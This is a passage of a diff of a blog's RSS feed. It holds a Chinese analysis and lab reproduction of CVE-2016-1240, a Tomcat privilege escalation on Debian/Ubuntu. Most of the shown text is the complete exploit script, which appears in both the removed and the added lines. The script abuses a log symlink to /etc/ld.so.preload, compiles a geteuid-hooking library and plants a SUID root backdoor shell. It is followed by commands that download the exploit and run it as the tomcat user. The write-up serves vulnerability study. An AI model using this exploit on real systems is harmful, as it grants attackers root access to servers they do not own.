+echo -e &amp;quot;\n[+] Starting the exploit in [\033[94m$mode\033[0m] mode with the following privileges: \n`id`&amp;quot;
+id | grep -q tomcat
+if [ $? -ne 0 ]; then
+    echo -e &amp;quot;\n[!] You need to execute the exploit as tomcat user! Exiting.\n&amp;quot;
+    exit 3
+fi
  
-&lt;span class=&quot;c&quot;&gt;# Set target paths&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;TOMCATLOG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; ! -f &lt;span class=&quot;nv&quot;&gt;$TOMCATLOG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[!] The specified Tomcat catalina.out log (&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$TOMCATLOG&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;) doesn&amp;#39;t exist. Try again.\n&amp;quot;&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;3
-&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Target Tomcat log file set to &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$TOMCATLOG&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;
+# Set target paths
+TOMCATLOG=&amp;quot;$1&amp;quot;
+if [ ! -f $TOMCATLOG ]; then
+    echo -e &amp;quot;\n[!] The specified Tomcat catalina.out log ($TOMCATLOG) doesn't exist. Try again.\n&amp;quot;
+    exit 3
+fi
+echo -e &amp;quot;\n[+] Target Tomcat log file set to $TOMCATLOG&amp;quot;
  
-&lt;span class=&quot;c&quot;&gt;# [ Deferred exploitation ]&lt;/span&gt;
+# [ Deferred exploitation ]
  
-&lt;span class=&quot;c&quot;&gt;# Symlink the log file to /etc/default/locale file which gets executed daily on default&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# tomcat installations on Debian/Ubuntu by the /etc/cron.daily/tomcatN logrotation cronjob around 6:25am.&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Attackers can freely add their commands to the /etc/default/locale script after Tomcat has been&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# restarted and file owner gets changed.&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$mode&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;deferred&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
-    rm -f &lt;span class=&quot;nv&quot;&gt;$TOMCATLOG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ln -s /etc/default/locale &lt;span class=&quot;nv&quot;&gt;$TOMCATLOG&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt; -ne &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
-        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[!] Couldn&amp;#39;t remove the &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$TOMCATLOG&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; file or create a symlink.&amp;quot;&lt;/span&gt;
+# Symlink the log file to /etc/default/locale file which gets executed daily on default
+# tomcat installations on Debian/Ubuntu by the /etc/cron.daily/tomcatN logrotation cronjob around 6:25am.
+# Attackers can freely add their commands to the /etc/default/locale script after Tomcat has been
+# restarted and file owner gets changed.
+if [ &amp;quot;$mode&amp;quot; = &amp;quot;deferred&amp;quot; ]; then
+    rm -f $TOMCATLOG &amp;amp;&amp;amp; ln -s /etc/default/locale $TOMCATLOG
+    if [ $? -ne 0 ]; then
+        echo -e &amp;quot;\n[!] Couldn't remove the $TOMCATLOG file or create a symlink.&amp;quot;
         cleanexit 3
-    &lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e  &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Symlink created at: \n`ls -l &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$TOMCATLOG&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`&amp;quot;&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e  &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] The current owner of the file is: \n`ls -l /etc/default/locale`&amp;quot;&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -ne &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Keep an eye on the owner change on /etc/default/locale . After the Tomcat restart / system reboot&amp;quot;&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -ne &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n    you&amp;#39;ll be able to add arbitrary commands to the file which will get executed with root privileges&amp;quot;&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -ne &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n    at ~6:25am by the /etc/cron.daily/tomcatN log rotation cron. See also -active mode if you can&amp;#39;t wait ;)\n\n&amp;quot;&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;0
-&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
+    fi
+    echo -e  &amp;quot;\n[+] Symlink created at: \n`ls -l $TOMCATLOG`&amp;quot;
+    echo -e  &amp;quot;\n[+] The current owner of the file is: \n`ls -l /etc/default/locale`&amp;quot;
+    echo -ne &amp;quot;\n[+] Keep an eye on the owner change on /etc/default/locale . After the Tomcat restart / system reboot&amp;quot;
+    echo -ne &amp;quot;\n    you'll be able to add arbitrary commands to the file which will get executed with root privileges&amp;quot;
+    echo -ne &amp;quot;\n    at ~6:25am by the /etc/cron.daily/tomcatN log rotation cron. See also -active mode if you can't wait ;)\n\n&amp;quot;
+    exit 0
+fi
  
-&lt;span class=&quot;c&quot;&gt;# [ Active exploitation ]&lt;/span&gt;
+# [ Active exploitation ]
  
-&lt;span class=&quot;nb&quot;&gt;trap &lt;/span&gt;ctrl_c INT
-&lt;span class=&quot;c&quot;&gt;# Compile privesc preload library&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Compiling the privesc shared library (&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PRIVESCSRC&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)&amp;quot;&lt;/span&gt;
-cat &lt;span class=&quot;s&quot;&gt;&amp;lt;&amp;lt;_solibeof_&amp;gt;$PRIVESCSRC&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;#define _GNU_SOURCE&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;#include &amp;lt;sys/stat.h&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;#include &amp;lt;dlfcn.h&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;uid_t geteuid(void) {&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;    static uid_t  (*old_geteuid)();&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;    old_geteuid = dlsym(RTLD_NEXT, &amp;quot;geteuid&amp;quot;);&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;    if ( old_geteuid() == 0 ) {&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;        chown(&amp;quot;$BACKDOORPATH&amp;quot;, 0, 0);&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;        chmod(&amp;quot;$BACKDOORPATH&amp;quot;, 04777);&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;        unlink(&amp;quot;/etc/ld.so.preload&amp;quot;);&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;    }&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;    return old_geteuid();&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;_solibeof_&lt;/span&gt;
-gcc -Wall -fPIC -shared -o &lt;span class=&quot;nv&quot;&gt;$PRIVESCLIB&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PRIVESCSRC&lt;/span&gt; -ldl
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt; -ne &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[!] Failed to compile the privesc lib &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PRIVESCSRC&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.&amp;quot;&lt;/span&gt;
-    cleanexit 2&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
+trap ctrl_c INT
+# Compile privesc preload library
+echo -e &amp;quot;\n[+] Compiling the privesc shared library ($PRIVESCSRC)&amp;quot;
+cat &amp;lt;&amp;lt;_solibeof_&amp;gt;$PRIVESCSRC
+#define _GNU_SOURCE
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;sys/stat.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;dlfcn.h&amp;gt;
+uid_t geteuid(void) {
+    static uid_t  (*old_geteuid)();
+    old_geteuid = dlsym(RTLD_NEXT, &amp;quot;geteuid&amp;quot;);
+    if ( old_geteuid() == 0 ) {
+        chown(&amp;quot;$BACKDOORPATH&amp;quot;, 0, 0);
+        chmod(&amp;quot;$BACKDOORPATH&amp;quot;, 04777);
+        unlink(&amp;quot;/etc/ld.so.preload&amp;quot;);
+    }
+    return old_geteuid();
+}
+_solibeof_
+gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl
+if [ $? -ne 0 ]; then
+    echo -e &amp;quot;\n[!] Failed to compile the privesc lib $PRIVESCSRC.&amp;quot;
+    cleanexit 2;
+fi
  
-&lt;span class=&quot;c&quot;&gt;# Prepare backdoor shell&lt;/span&gt;
-cp &lt;span class=&quot;nv&quot;&gt;$BACKDOORSH&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$BACKDOORPATH&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Backdoor/low-priv shell installed at: \n`ls -l &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BACKDOORPATH&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`&amp;quot;&lt;/span&gt;
+# Prepare backdoor shell
+cp $BACKDOORSH $BACKDOORPATH
+echo -e &amp;quot;\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`&amp;quot;
  
-&lt;span class=&quot;c&quot;&gt;# Safety check&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; -f /etc/ld.so.preload &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[!] /etc/ld.so.preload already exists. Exiting for safety.&amp;quot;&lt;/span&gt;
+# Safety check
+if [ -f /etc/ld.so.preload ]; then
+    echo -e &amp;quot;\n[!] /etc/ld.so.preload already exists. Exiting for safety.&amp;quot;
     cleanexit 2
-&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
+fi
  
-&lt;span class=&quot;c&quot;&gt;# Symlink the log file to ld.so.preload&lt;/span&gt;
-rm -f &lt;span class=&quot;nv&quot;&gt;$TOMCATLOG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ln -s /etc/ld.so.preload &lt;span class=&quot;nv&quot;&gt;$TOMCATLOG&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt; -ne &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[!] Couldn&amp;#39;t remove the &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$TOMCATLOG&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; file or create a symlink.&amp;quot;&lt;/span&gt;
+# Symlink the log file to ld.so.preload
+rm -f $TOMCATLOG &amp;amp;&amp;amp; ln -s /etc/ld.so.preload $TOMCATLOG
+if [ $? -ne 0 ]; then
+    echo -e &amp;quot;\n[!] Couldn't remove the $TOMCATLOG file or create a symlink.&amp;quot;
     cleanexit 3
-&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Symlink created at: \n`ls -l &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$TOMCATLOG&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`&amp;quot;&lt;/span&gt;
+fi
+echo -e &amp;quot;\n[+] Symlink created at: \n`ls -l $TOMCATLOG`&amp;quot;
  
-&lt;span class=&quot;c&quot;&gt;# Wait for Tomcat to re-open the logs&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -ne &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Waiting for Tomcat to re-open the logs/Tomcat service restart...&amp;quot;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e  &lt;span class=&quot;s2&quot;&gt;&amp;quot;\nYou could speed things up by executing : kill [Tomcat-pid] (as tomcat user) if needed ;)&amp;quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; :&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; 
+# Wait for Tomcat to re-open the logs
+echo -ne &amp;quot;\n[+] Waiting for Tomcat to re-open the logs/Tomcat service restart...&amp;quot;
+echo -e  &amp;quot;\nYou could speed things up by executing : kill [Tomcat-pid] (as tomcat user) if needed ;)&amp;quot;
+while :; do 
     sleep 0.1
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; -f /etc/ld.so.preload &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
-        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PRIVESCLIB&lt;/span&gt; &amp;gt; /etc/ld.so.preload
-        &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+    if [ -f /etc/ld.so.preload ]; then
+        echo $PRIVESCLIB &amp;gt; /etc/ld.so.preload
+        break;
+    fi
+done
  
-&lt;span class=&quot;c&quot;&gt;# /etc/ld.so.preload file should be owned by tomcat user at this point&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Inject the privesc.so shared library to escalate privileges&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PRIVESCLIB&lt;/span&gt; &amp;gt; /etc/ld.so.preload
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Tomcat restarted. The /etc/ld.so.preload file got created with tomcat privileges: \n`ls -l /etc/ld.so.preload`&amp;quot;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Adding &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PRIVESCLIB&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; shared lib to /etc/ld.so.preload&amp;quot;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`&amp;quot;&lt;/span&gt;
+# /etc/ld.so.preload file should be owned by tomcat user at this point
+# Inject the privesc.so shared library to escalate privileges
+echo $PRIVESCLIB &amp;gt; /etc/ld.so.preload
+echo -e &amp;quot;\n[+] Tomcat restarted. The /etc/ld.so.preload file got created with tomcat privileges: \n`ls -l /etc/ld.so.preload`&amp;quot;
+echo -e &amp;quot;\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload&amp;quot;
+echo -e &amp;quot;\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`&amp;quot;
  
-&lt;span class=&quot;c&quot;&gt;# Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Escalating privileges via the &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SUIDBIN&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; SUID binary to get root!&amp;quot;&lt;/span&gt;
+# Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)
+echo -e &amp;quot;\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!&amp;quot;
 sudo --help 2&amp;gt;/dev/null &amp;gt;/dev/null
  
-&lt;span class=&quot;c&quot;&gt;# Check for the rootshell&lt;/span&gt;
-ls -l &lt;span class=&quot;nv&quot;&gt;$BACKDOORPATH&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; grep rws &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; grep -q root
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt; -eq &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt; 
-    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Rootshell got assigned root SUID perms at: \n`ls -l &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BACKDOORPATH&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`&amp;quot;&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n\033[94mPlease tell me you&amp;#39;re seeing this too ;) \033[0m&amp;quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[!] Failed to get root&amp;quot;&lt;/span&gt;
+# Check for the rootshell
+ls -l $BACKDOORPATH | grep rws | grep -q root
+if [ $? -eq 0 ]; then 
+    echo -e &amp;quot;\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`&amp;quot;
+    echo -e &amp;quot;\n\033[94mPlease tell me you're seeing this too ;) \033[0m&amp;quot;
+else
+    echo -e &amp;quot;\n[!] Failed to get root&amp;quot;
     cleanexit 2
-&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
+fi
  
-&lt;span class=&quot;c&quot;&gt;# Execute the rootshell&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Executing the rootshell &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BACKDOORPATH&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; now! \n&amp;quot;&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$BACKDOORPATH&lt;/span&gt; -p -c &lt;span class=&quot;s2&quot;&gt;&amp;quot;rm -f /etc/ld.so.preload; rm -f &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PRIVESCLIB&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$BACKDOORPATH&lt;/span&gt; -p
+# Execute the rootshell
+echo -e &amp;quot;\n[+] Executing the rootshell $BACKDOORPATH now! \n&amp;quot;
+$BACKDOORPATH -p -c &amp;quot;rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB&amp;quot;
+$BACKDOORPATH -p
  
-&lt;span class=&quot;c&quot;&gt;# Job done.&lt;/span&gt;
-cleanexit 0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+# Job done.
+cleanexit 0&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
 &lt;p&gt;首先是49到66行的cleanexit和ctrl_c函数负责在退出后环境的清理，直至原始的状态。从77到81行看出脚本接受catalina.out的路径和模式的选择，模式分为deferred和active模式，默认为active。83到97行则是检查是否为tomcat用户运行地脚本和对应路径的catalina.out文件是否存在。&lt;/p&gt;
 
@@ -895,18 +1054,22 @@ cleanexit 0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;直接下载作者提供的脚本还不能用，需要编辑一下，而且编译环境需要gcc，具体如下:&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo apt-get install gcc
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget https://www.exploit-db.com/download/40450
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sed -n &lt;span class=&quot;s1&quot;&gt;&amp;#39;93, 296p&amp;#39;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;40450&lt;/span&gt; &amp;gt; exploit.sh
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;chmod &lt;span class=&quot;m&quot;&gt;777&lt;/span&gt; exploit.sh
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo apt-get install dos2unix
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dos2unix exploit.sh&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;$ sudo apt-get install gcc
+$ wget https://www.exploit-db.com/download/40450
+$ sed -n '93, 296p' 40450 &amp;gt; exploit.sh
+$ chmod 777 exploit.sh
+$ sudo apt-get install dos2unix
+$ dos2unix exploit.sh&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
 &lt;p&gt;为了模拟攻击者拿到了tomcat的shell和创造机会使tomcat重启，我将tomcat的shell设置了一下，并且使用sleep将重启服务后置几秒然后运行攻击脚本，具体如下：&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo usermod -s /bin/bash tomcat7
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sleep &lt;span class=&quot;m&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sudo service tomcat7 restart &lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo su tomcat -c &lt;span class=&quot;s2&quot;&gt;&amp;quot;/bin/bash exploit.sh /var/log/tomcat7/catalina.out&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;$ sudo usermod -s /bin/bash tomcat7
+$ sleep 20 &amp;amp;&amp;amp; sudo service tomcat7 restart &amp;amp;
+$ sudo su tomcat -c &amp;quot;/bin/bash exploit.sh /var/log/tomcat7/catalina.out&amp;quot;&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20161012/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
@@ -918,7 +1081,7 @@ cleanexit 0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 </description>
         
-        <pubDate>Wed, 12 Oct 2016 14:00:00 -0400</pubDate>
+        <pubDate>Thu, 13 Oct 2016 02:00:00 +0800</pubDate>
         <link>
         https://larryxi.github.io/cve-2016-1240-analysis.html</link>
         <guid isPermaLink="true">https://larryxi.github.io/cve-2016-1240-analysis.html</guid>
@@ -939,11 +1102,12 @@ cleanexit 0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;在这里我会使用LAMP进行漏洞的调试和复现，首先在VirtualBox上安装Ubuntu 14.04 Server，安装成功后我们替换一下apt的源方便之后环境的安装与下载，命令如下：&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /etc/apt
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo mv sources.list sources.list.bak
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo vim sources.list
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;$ cd /etc/apt
+$ sudo mv sources.list sources.list.bak
+$ sudo vim sources.list
 
-&lt;span class=&quot;c&quot;&gt;#我们写入aliyun的源&lt;/span&gt;
+#我们写入aliyun的源
 
 deb http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse
 deb http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse
@@ -956,50 +1120,63 @@ deb-src http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted univers
 deb-src http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse
 deb-src http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse
 
-&lt;span class=&quot;c&quot;&gt;#最后再update一下&lt;/span&gt;
+#最后再update一下
 
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo apt-get update
